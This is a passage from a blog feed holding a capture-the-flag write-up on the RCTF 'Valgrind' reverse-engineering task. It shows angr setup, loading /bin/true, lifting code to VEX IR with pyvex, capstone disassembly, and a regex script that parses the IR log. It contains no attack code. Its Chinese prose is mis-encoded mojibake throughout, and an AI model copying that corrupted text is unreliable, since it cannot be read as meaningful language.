
    <span class="token keyword">for</span> t <span class="token keyword">in</span> self<span class="token punctuation">.</span>_techniques<span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span>Veritesting<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> deviation_filter_saved <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                <span class="token keyword">del</span> t<span class="token punctuation">.</span>options<span class="token punctuation">[</span><span class="token string">"deviation_filter"</span><span class="token punctuation">]</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                t<span class="token punctuation">.</span>options<span class="token punctuation">[</span><span class="token string">"deviation_filter"</span><span class="token punctuation">]</span> <span class="token operator">=</span> deviation_filter_saved
            <span class="token keyword">break</span>

    <span class="token keyword">return</span> self<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>ç¬¦å·æ‰§è¡Œ</category>
        <category>Angr</category>
      </categories>
      <tags>
        <tag>ç¬¦å·æ‰§è¡Œ</tag>
        <tag>angr</tag>
      </tags>
  </entry>
  <entry>
    <title>RCTF Valgrind</title>
    <url>/2021/07/19/rctf_valgrind/</url>
    <content><![CDATA[<h1 id="Valgrind"><a href="#Valgrind" class="headerlink" title="Valgrind"></a>Valgrind</h1><p>ç»™çš„æ˜¯ angr.SimState å¯¹è±¡åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­è¾“å‡ºçš„æ—¥å¿—ã€‚<br>ç”±äºç½‘ä¸Šèµ„æ–™ä¹Ÿæ¯”è¾ƒå¤šï¼Œæˆ–è®¸æœ‰äº›æ‚ä¹±ï¼Œæˆ‘ä¹Ÿåšä¸€äº›ä»‹ç»ã€‚è®©å¤§å®¶ä¹Ÿèƒ½å¿«é€Ÿä¸Šæ‰‹ã€‚æš‚æ—¶å°±æ¢ç´¢åˆ°è¿™ï¼Œæœ‰ç©ºå†çœ‹çœ‹æºç ï¼Œå†æ·±å…¥ä¸€äº›ã€‚</p>
<blockquote>
<p>Angr : A powerful and user-friendly binary analysis platform!</p>
</blockquote>
<h2 id="ä¸€äº›ä»‹ç»"><a href="#ä¸€äº›ä»‹ç»" class="headerlink" title="ä¸€äº›ä»‹ç»"></a>ä¸€äº›ä»‹ç»</h2><p>é…ç½® angr ç¯å¢ƒ <a href="https://docs.angr.io/introductory-errata/install">https://docs.angr.io/introductory-errata/install</a></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">## å¯¹äºæˆ‘çš„ wsl2 </span>
<span class="token function">git</span> clone https://github.com/angr/angr-dev
<span class="token builtin class-name">cd</span> angr-dev
./setup.sh -i -e angr
<span class="token comment">## è¦æ˜¯æœ‰åŒ…ä¸‹ä¸æ¥ï¼ŒæŒ‚ä¸ªä»£ç†ï¼Œæˆ–è€…æ‰‹åŠ¨ä¸‹ï¼Œéƒ½å¯ä»¥</span>
<span class="token comment">## æ¥ä¸‹æ¥è¦é…ç½® ~/.bashrc</span>
<span class="token builtin class-name">export</span> WORK_HOME <span class="token operator">=</span> ~/.vituralenvs
<span class="token builtin class-name">source</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">find</span> / -name <span class="token string">"virtualenvwrapper.sh"</span><span class="token variable">)</span></span>
<span class="token comment">## è¿™ä¸ªä¹Ÿå¯ä»¥æ‰‹åŠ¨è®¾ç½®è·¯å¾„</span>
<span class="token comment">## å‘ç° angr venv ä¸­å¯¼å…¥ä¸äº† angr</span>
<span class="token comment">## å¯ä»¥åœ¨ angr venv ä¸­ä½¿ç”¨ pip install -e angr</span>
<span class="token comment">## pip çš„ -e å‚æ•°ï¼Œè¿˜ä¸å¤§æ¸…æ¥šï¼Œç®€å•çš„è¯´ä¼¼ä¹æ˜¯è·¯å¾„é€‰æ‹©</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>ç”±æµ…å…¥æ·±ã€‚<br>æˆ‘ä»¬å…ˆæ¥ç”¨ angr æ¥è½½å…¥ä¸€ä¸‹ç¨‹åºã€‚</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">In <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>: <span class="token function">import</span> monkeyhex,cle,pyvex

In <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>: ld <span class="token operator">=</span> cle.Loader<span class="token punctuation">(</span><span class="token string">"/bin/true"</span><span class="token punctuation">)</span>

In <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>: data <span class="token operator">=</span> ld.memory.load<span class="token punctuation">(</span>ld.main_object.entry,0x100<span class="token punctuation">)</span>

In <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>: data
Out<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>: b<span class="token string">'1\xedI\x89\xd1^H\x89\xe2H\x83\xe4\xf0PTL\x8d\x05*2\x00\x00H\x8d\r\xb31\x00\x00H\x8d=\x1c\xff\xff\xff\xff\x15\xfeW \x00\xf4\x0f\x1fD\x00\x00H\x8d=\x99X \x00UH\x8d\x05\x91X \x00H9\xf8H\x89\xe5t\x19H\x8b\x05\xd2W \x00H\x85\xc0t\r]\xff\xe0f.\x0f\x1f\x84\x00\x00\x00\x00\x00]\xc3\x0f\x1f@\x00f.\x0f\x1f\x84\x00\x00\x00\x00\x00H\x8d=YX \x00H\x8d5RX \x00UH)\xfeH\x89\xe5H\xc1\xfe\x03H\x89\xf0H\xc1\xe8?H\x01\xc6H\xd1\xfet\x18H\x8b\x05\x99W \x00H\x85\xc0t\x0c]\xff\xe0f\x0f\x1f\x84\x00\x00\x00\x00\x00]\xc3\x0f\x1f@\x00f.\x0f\x1f\x84\x00\x00\x00\x00\x00\x80=1X \x00\x00u/H\x83=oW \x00\x00UH\x89\xe5t\x0cH\x8b=zW \x00\xe8M\xfe\xff\xff\xe8H\xff\xff\xff\xc6\x05\tX \x00\x01]\xc3\x0f\x1f\x80\x00\x00\x00\x00\xf3\xc3f\x0f\x1fD\x00\x00'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>ç¬¬ä¸€æ­¥ï¼ŒåŠ è½½ã€‚æ­¤æ—¶äºŒè¿›åˆ¶æ–‡ä»¶å·²ç»é€šè¿‡ cle åŠ è½½åˆ°åˆ°å†…å­˜äº†ã€‚è¿™é‡Œæš‚æ—¶ä¸æåŠ¨æ€é“¾æ¥å™¨ï¼Œå½“ç„¶åŠ¨æ€é“¾æ¥å™¨å¯ä»¥å­˜åœ¨ï¼Œæ²¡äº†çš„è¯ä¸€äº›è·³è½¬çš„å‡½æ•°å°±ä¸èƒ½åˆ°æ­£ç¡®çš„ä½ç½®äº†ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">In [5]: irsb &#x3D; pyvex.lift(data,ld.main_object.entry,ld.main_object.arch)

In [6]: irsb
Out[6]: IRSB &lt;0x2a bytes, 11 ins., &lt;Arch AMD64 (LE)&gt;&gt; at 0x4017b0

In [7]: irsb.pp()
IRSB &#123;
   t0:Ity_I32 t1:Ity_I32 t2:Ity_I32 t3:Ity_I64 t4:Ity_I64 t5:Ity_I64 t6:Ity_I64 t7:Ity_I64 t8:Ity_I64 t9:Ity_I64 t10:Ity_I64 t11:Ity_I64 t12:Ity_I64 t13:Ity_I64 t14:Ity_I64 t15:Ity_I32 t16:Ity_I64 t17:Ity_I64 t18:Ity_I64 t19:Ity_I64 t20:Ity_I32 t21:Ity_I64 t22:Ity_I32 t23:Ity_I64 t24:Ity_I64 t25:Ity_I64 t26:Ity_I64 t27:Ity_I64 t28:Ity_I64 t29:Ity_I64 t30:Ity_I64 t31:Ity_I64 t32:Ity_I64 t33:Ity_I64 t34:Ity_I64 t35:Ity_I64 t36:Ity_I64

   00 | ------ IMark(0x4017b0, 2, 0) ------
   01 | PUT(rbp) &#x3D; 0x0000000000000000
   02 | ------ IMark(0x4017b2, 3, 0) ------
   03 | t26 &#x3D; GET:I64(rdx)
   04 | PUT(r9) &#x3D; t26
   05 | PUT(rip) &#x3D; 0x00000000004017b5
   06 | ------ IMark(0x4017b5, 1, 0) ------
   07 | t4 &#x3D; GET:I64(rsp)
   08 | t3 &#x3D; LDle:I64(t4)
   09 | t27 &#x3D; Add64(t4,0x0000000000000008)
   10 | PUT(rsi) &#x3D; t3
   11 | ------ IMark(0x4017b6, 3, 0) ------
   12 | PUT(rdx) &#x3D; t27
   13 | ------ IMark(0x4017b9, 4, 0) ------
   14 | t5 &#x3D; And64(t27,0xfffffffffffffff0)
   15 | PUT(cc_op) &#x3D; 0x0000000000000014
   16 | PUT(cc_dep1) &#x3D; t5
   17 | PUT(cc_dep2) &#x3D; 0x0000000000000000
   18 | PUT(rip) &#x3D; 0x00000000004017bd
   19 | ------ IMark(0x4017bd, 1, 0) ------
   20 | t8 &#x3D; GET:I64(rax)
   21 | t29 &#x3D; Sub64(t5,0x0000000000000008)
   22 | PUT(rsp) &#x3D; t29
   23 | STle(t29) &#x3D; t8
   24 | PUT(rip) &#x3D; 0x00000000004017be
   25 | ------ IMark(0x4017be, 1, 0) ------
   26 | t31 &#x3D; Sub64(t29,0x0000000000000008)
   27 | PUT(rsp) &#x3D; t31
   28 | STle(t31) &#x3D; t29
   29 | ------ IMark(0x4017bf, 7, 0) ------
   30 | PUT(r8) &#x3D; 0x00000000004049f0
   31 | ------ IMark(0x4017c6, 7, 0) ------
   32 | PUT(rcx) &#x3D; 0x0000000000404980
   33 | ------ IMark(0x4017cd, 7, 0) ------
   34 | PUT(rdi) &#x3D; 0x00000000004016f0
   35 | PUT(rip) &#x3D; 0x00000000004017d4
   36 | ------ IMark(0x4017d4, 6, 0) ------
   37 | t17 &#x3D; LDle:I64(0x0000000000606fd8)
   38 | t33 &#x3D; Sub64(t31,0x0000000000000008)
   39 | PUT(rsp) &#x3D; t33
   40 | STle(t33) &#x3D; 0x00000000004017da
   41 | t35 &#x3D; Sub64(t33,0x0000000000000080)
   42 | &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; AbiHint(0xt35, 128, t17) &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
   NEXT: PUT(rip) &#x3D; t17; Ijk_Call
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>æˆ‘ä»¬æŠŠè¿™å—æ•°æ®ï¼Œé€šè¿‡ lift å‡½æ•°æŠŠä»–å˜æˆä¸€å— irsbã€‚è¿™å— irsb è¿™é‡Œæˆ‘æŠŠå®ƒç§°ä¸º IR Blockï¼Œ å°±æ˜¯ VEX IR çš„åŸºæœ¬å—ï¼ŒåŠ¨æ€æ‰§è¡Œçš„æ—¶å€™ä¸ºäº†å…¼å®¹å¤šä¸ªæ¶æ„ï¼Œangr å°±ä¼šæ‰§è¡Œè¿™ä¸€å—ï¼Œæ‰§è¡Œåˆä¼šæ¶‰åŠåˆ°å¦å¤–ä¸€ä¸ªæ¨¡å—ã€‚</p>
<p>è¿™é‡Œä¹‹æ‰€ä»¥è¦ä½¿ç”¨ dataï¼Œaddrï¼Œarchã€‚å¯ä»¥çœ‹åˆ°æ¯ä¸€æ®µ IMark éƒ½æœ‰è¡¨ç¤º (åœ°å€ï¼Œæ±‡ç¼–é•¿åº¦ï¼Œä¸çŸ¥é“æ˜¯ä»€ä¹ˆçš„ä¸€ä¸ªå˜é‡)</p>
<p>è¿˜æœ‰å¦å¤–ä¸€ä¸ª Blockï¼Œæ˜¯ç”± capstone æ¨¡å—æä¾›ï¼Œè€Œæ›´åº•å±‚æˆ‘ä¹Ÿæ²¡æœ‰æŒ–æ˜è¿‡ï¼Œåªå¥½ä½¿ç”¨ angr é›†æˆçš„ Capstone äº†ã€‚è™½è¯´å®ƒæ˜¯åæ±‡ç¼–æ¨¡å—ï¼Œä½†æ˜¯ä¼¼ä¹æ²¡æœ‰æä¾›ç›´æ¥çš„æ¥å£ï¼Œæˆ‘æƒ³æ˜¯åº”è¯¥æœ‰ä¸ªæä¾› data æˆ–è€… addr size å’Œ arch è¾“å‡ºåæ±‡ç¼–çš„ã€‚è¿™ä¸ªæˆ‘è¿˜å¾—æ‰¾æ‰¾ã€‚è¿™é‡Œçš„è¯æˆ‘å°±æŒ‰éƒ¨å°±ç­çš„æ¥äº†ã€‚</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">In <span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">]</span>: p <span class="token operator">=</span> angr.Project<span class="token punctuation">(</span><span class="token string">"/bin/true"</span><span class="token punctuation">)</span>
WARNING <span class="token operator">|</span> <span class="token number">2021</span>-09-17 <span class="token number">23</span>:29:36,414 <span class="token operator">|</span> cle.loader <span class="token operator">|</span> The main binary is a position-independent executable. It is being loaded with a base address of 0x400000.
In <span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span>: st <span class="token operator">=</span> p.factory.blank_state<span class="token punctuation">(</span>addr <span class="token operator">=</span> ld.main_object.entry<span class="token punctuation">)</span>
In <span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">]</span>: st.addr
Out<span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">]</span>: 0x4017b0
In <span class="token punctuation">[</span><span class="token number">42</span><span class="token punctuation">]</span>: bb <span class="token operator">=</span> st.block<span class="token punctuation">(</span><span class="token punctuation">)</span>
In <span class="token punctuation">[</span><span class="token number">43</span><span class="token punctuation">]</span>: bb.pp<span class="token punctuation">(</span><span class="token punctuation">)</span>
0x4017b0:       xor     ebp, ebp
0x4017b2:       mov     r9, rdx
0x4017b5:       pop     rsi
0x4017b6:       mov     rdx, rsp
0x4017b9:       and     rsp, 0xfffffffffffffff0
0x4017bd:       push    rax
0x4017be:       push    rsp
0x4017bf:       lea     r8, <span class="token punctuation">[</span>rip + 0x322a<span class="token punctuation">]</span>
0x4017c6:       lea     rcx, <span class="token punctuation">[</span>rip + 0x31b3<span class="token punctuation">]</span>
0x4017cd:       lea     rdi, <span class="token punctuation">[</span>rip - 0xe4<span class="token punctuation">]</span>
0x4017d4:       call    qword ptr <span class="token punctuation">[</span>rip + 0x2057fe<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>æ¥ä¸‹æ¥å°±æ˜¯æ±‡ç¼–ä»¥åŠä¸€äº›å¯ä»¥ç”¨äºè§£æçš„å‚æ•°ï¼Œç•¥ä½œå±•ç¤ºã€‚</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">In <span class="token punctuation">[</span><span class="token number">46</span><span class="token punctuation">]</span>: bb.capstone
Out<span class="token punctuation">[</span><span class="token number">46</span><span class="token punctuation">]</span>: <span class="token operator">&lt;</span>DisassemblerBlock <span class="token keyword">for</span> 0x4017b<span class="token operator"><span class="token file-descriptor important">0</span>></span>

In <span class="token punctuation">[</span><span class="token number">47</span><span class="token punctuation">]</span>: bb.capstone.pp<span class="token punctuation">(</span><span class="token punctuation">)</span>
0x4017b0:       xor     ebp, ebp
0x4017b2:       mov     r9, rdx
0x4017b5:       pop     rsi
0x4017b6:       mov     rdx, rsp
0x4017b9:       and     rsp, 0xfffffffffffffff0
0x4017bd:       push    rax
0x4017be:       push    rsp
0x4017bf:       lea     r8, <span class="token punctuation">[</span>rip + 0x322a<span class="token punctuation">]</span>
0x4017c6:       lea     rcx, <span class="token punctuation">[</span>rip + 0x31b3<span class="token punctuation">]</span>
0x4017cd:       lea     rdi, <span class="token punctuation">[</span>rip - 0xe4<span class="token punctuation">]</span>
0x4017d4:       call    qword ptr <span class="token punctuation">[</span>rip + 0x2057fe<span class="token punctuation">]</span>

In <span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span>: bb.capstone.insns
Out<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span>: 
<span class="token punctuation">[</span><span class="token operator">&lt;</span>DisassemblerInsn <span class="token string">"xor"</span> <span class="token keyword">for</span> 0x4017b<span class="token operator"><span class="token file-descriptor important">0</span>></span>,
 <span class="token operator">&lt;</span>DisassemblerInsn <span class="token string">"mov"</span> <span class="token keyword">for</span> 0x4017b<span class="token operator"><span class="token file-descriptor important">2</span>></span>,
 <span class="token operator">&lt;</span>DisassemblerInsn <span class="token string">"pop"</span> <span class="token keyword">for</span> 0x4017b<span class="token operator"><span class="token file-descriptor important">5</span>></span>,
 <span class="token operator">&lt;</span>DisassemblerInsn <span class="token string">"mov"</span> <span class="token keyword">for</span> 0x4017b<span class="token operator"><span class="token file-descriptor important">6</span>></span>,
 <span class="token operator">&lt;</span>DisassemblerInsn <span class="token string">"and"</span> <span class="token keyword">for</span> 0x4017b<span class="token operator"><span class="token file-descriptor important">9</span>></span>,
 <span class="token operator">&lt;</span>DisassemblerInsn <span class="token string">"push"</span> <span class="token keyword">for</span> 0x4017bd<span class="token operator">></span>,
 <span class="token operator">&lt;</span>DisassemblerInsn <span class="token string">"push"</span> <span class="token keyword">for</span> 0x4017be<span class="token operator">></span>,
 <span class="token operator">&lt;</span>DisassemblerInsn <span class="token string">"lea"</span> <span class="token keyword">for</span> 0x4017bf<span class="token operator">></span>,
 <span class="token operator">&lt;</span>DisassemblerInsn <span class="token string">"lea"</span> <span class="token keyword">for</span> 0x4017c<span class="token operator"><span class="token file-descriptor important">6</span>></span>,
 <span class="token operator">&lt;</span>DisassemblerInsn <span class="token string">"lea"</span> <span class="token keyword">for</span> 0x4017cd<span class="token operator">></span>,
 <span class="token operator">&lt;</span>DisassemblerInsn <span class="token string">"call"</span> <span class="token keyword">for</span> 0x4017d<span class="token operator"><span class="token file-descriptor important">4</span>></span><span class="token punctuation">]</span>

In <span class="token punctuation">[</span><span class="token number">49</span><span class="token punctuation">]</span>: bb.capstone.insns<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>.op_str
Out<span class="token punctuation">[</span><span class="token number">49</span><span class="token punctuation">]</span>: <span class="token string">'ebp, ebp'</span>

In <span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span>: bb.capstone.insns<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>.insn
Out<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span>: <span class="token operator">&lt;</span>CsInsn 0x4017b0 <span class="token punctuation">[</span>31ed<span class="token punctuation">]</span>: xor ebp, ebp<span class="token operator">></span>

In <span class="token punctuation">[</span><span class="token number">51</span><span class="token punctuation">]</span>: bb.capstone.insns<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>.size
Out<span class="token punctuation">[</span><span class="token number">51</span><span class="token punctuation">]</span>: 0x2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>è‡³æ­¤ä¸€å°éƒ¨åˆ†çš„é™æ€åˆ†æçš„æ¨¡å—å°±ä»‹ç»å¥½äº†ã€‚</p>
<h2 id="æ¥ä¸‹æ¥å°±å¯ä»¥ç›´æ¥åšé¢˜å•¦233"><a href="#æ¥ä¸‹æ¥å°±å¯ä»¥ç›´æ¥åšé¢˜å•¦233" class="headerlink" title="æ¥ä¸‹æ¥å°±å¯ä»¥ç›´æ¥åšé¢˜å•¦233"></a>æ¥ä¸‹æ¥å°±å¯ä»¥ç›´æ¥åšé¢˜å•¦233</h2><p>æˆ‘ä»¬çœ‹å›æ ‡é¢˜ï¼Œé¢˜ç›®è¦æ±‚çš„å°±æ˜¯åˆ†æ ä¸€å † IRSB ä¿ºå°±å«ä»– SB å¥½äº†(åè¯å¤§å¸ˆ)è€Œä¸”æˆ‘ä»¬ä¹Ÿèƒ½æ¯”è¾ƒæ¸…æ¥šçš„çœ‹åˆ°æ¯ä¸ª block å°¾éƒ¨éƒ½æœ‰è·³è½¬çš„åœ°å€ï¼Œä¹Ÿå¯èƒ½æœ‰è·³è½¬çš„ä¸€äº›æ¡ä»¶ã€‚block çš„å¤´éƒ¨æœ‰ä¸€äº›å¯„å­˜å™¨(å¤§æ¦‚å§ï¼Œåº”è¯¥å¯ä»¥ç§°ä½œå¯„å­˜å™¨)</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">IRSB &#123;
   t0:Ity_I32 t1:Ity_I32 t2:Ity_I32 t3:Ity_I32 t4:Ity_I32 t5:Ity_I32 t6:Ity_I32

   00 | ------ IMark(0x8048464, 3, 0) ------
   01 | t2 &#x3D; GET:I32(esp)
   02 | t0 &#x3D; Sub32(t2,0x00000054)
   03 | PUT(cc_op) &#x3D; 0x00000006
   04 | PUT(cc_dep1) &#x3D; t2
   05 | PUT(cc_dep2) &#x3D; 0x00000054
   06 | PUT(cc_ndep) &#x3D; 0x00000000
   07 | PUT(eip) &#x3D; 0x08048467
   08 | ------ IMark(0x8048467, 5, 0) ------
   09 | t4 &#x3D; Sub32(t0,0x00000004)
   10 | PUT(esp) &#x3D; t4
   11 | STle(t4) &#x3D; 0x0804846c
   NEXT: PUT(eip) &#x3D; 0x080485f1; Ijk_Call
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>ä¸­é—´çš„æ¯ä¸€æ®µ IMark å°±è¡¨ç¤ºä¸€æ®µæ±‡ç¼–è½¬æ¢æˆçš„ vex ir ï¼Œè™½ç„¶ä½†æ˜¯ï¼Œè¿™ä¸ªå’Œä»–çš„æ±‡ç¼–å…¶å®ä¸ç­‰ä»·ï¼Œæˆ‘ä»¬åº”è¯¥ä»ä¸€æ•´ä¸ª blcok æ¥çœ‹ä»–çš„ ir æˆ–è€… ä»–çš„ æ±‡ç¼–ã€‚è¿™æ ·æ‰èƒ½ç†è§£ä»–åœ¨å¹²ä»€ä¹ˆã€‚</p>
<p>æœ‰å…³ vex ir æŒ‡ä»¤çš„ä¸€äº›<a href="https://github.com/smparkes/valgrind-vex/blob/master/pub/libvex_ir.h">æ³¨é‡Š</a>ï¼Œè¿˜æ˜¯å¯ä»¥é£Ÿç”¨çš„ã€‚</p>
<p>æ€ä¹ˆäº§ç”Ÿçš„è¿™ä¸€æ®µï¼Œæˆ‘ä»¬å°±å¯ä»¥çœ‹å›ä¹‹å‰è°ƒç”¨è¿‡çš„ lift ï¼Œè€Œ lift å½“ç„¶æ˜¯é’ˆå¯¹ä¸åŒæ¶æ„æ‰€å»ºç«‹çš„ï¼Œä¹Ÿå°±æ˜¯ lift å‡½æ•°ä¼šè¢«ä¸åŒçš„æ¶æ„æ‰€éœ€è¦çš„ lift é‡å†™ã€‚</p>
<p>é¢˜ç›®å¾ˆé•¿ï¼Œç»™äº† 4k è¡Œï¼Œè¿™å…¶å®ä¸æ˜¯å¾ˆåˆ©äºçº¿æ€§çš„åˆ†æã€‚äºæ˜¯ä¹æˆ‘ä»¬å¯ä»¥å†™ä¸€æ®µ py è„šæœ¬æå–ä¸€ä¸‹ã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re
<span class="token keyword">import</span> IPython

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./oldlog.log"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> file1<span class="token punctuation">:</span>
    data <span class="token operator">=</span> file1<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    file1<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>


target <span class="token operator">=</span> <span class="token string">"IMark\(([\w]*), \d, \d\)"</span>

res <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>target<span class="token punctuation">,</span>data<span class="token punctuation">)</span>

addr_int_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
addr_int_list<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>
addr_str_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">hex</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> addr_int_list<span class="token punctuation">]</span>

addr_code <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>

<span class="token keyword">for</span> addr <span class="token keyword">in</span> addr_str_list<span class="token punctuation">:</span>
    target1 <span class="token operator">=</span> <span class="token string">'------ IMark\(%s, \d&#123;1,3&#125;, \d&#123;1,3&#125;\) ------\n([\w\W]*?)\n\&#125;'</span><span class="token operator">%</span>addr
    target2 <span class="token operator">=</span> <span class="token string">'------ IMark\(%s, \d&#123;1,3&#125;, \d&#123;1,3&#125;\) ------\n([\w\W]*?)   \d&#123;1,3&#125; \| ------ IMark'</span><span class="token operator">%</span>addr
    code1 <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>target1<span class="token punctuation">,</span>data<span class="token punctuation">)</span>
    code2 <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>target2<span class="token punctuation">,</span>data<span class="token punctuation">)</span>

    <span class="token keyword">if</span> code1 <span class="token operator">!=</span> <span class="token boolean">None</span> <span class="token keyword">and</span> code2 <span class="token operator">!=</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        addr_code<span class="token punctuation">[</span>addr<span class="token punctuation">]</span> <span class="token operator">=</span> code1<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code1<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token builtin">len</span><span class="token punctuation">(</span>code2<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">else</span> code2<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> code2 <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        addr_code<span class="token punctuation">[</span>addr<span class="token punctuation">]</span> <span class="token operator">=</span> code1<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> code1 <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        addr_code<span class="token punctuation">[</span>addr<span class="token punctuation">]</span> <span class="token operator">=</span> code2<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./newlog.log"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> file2<span class="token punctuation">:</span>
    <span class="token keyword">for</span> addr <span class="token keyword">in</span> addr_str_list<span class="token punctuation">:</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>addr <span class="token operator">==</span> <span class="token string">'0x8048554'</span> <span class="token keyword">or</span> addr <span class="token operator">==</span> <span class="token string">'0x8048552'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>addr<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>addr_code<span class="token punctuation">[</span>addr<span class="token punctuation">]</span><span class="token punctuation">)</span>
        file2<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>addr<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
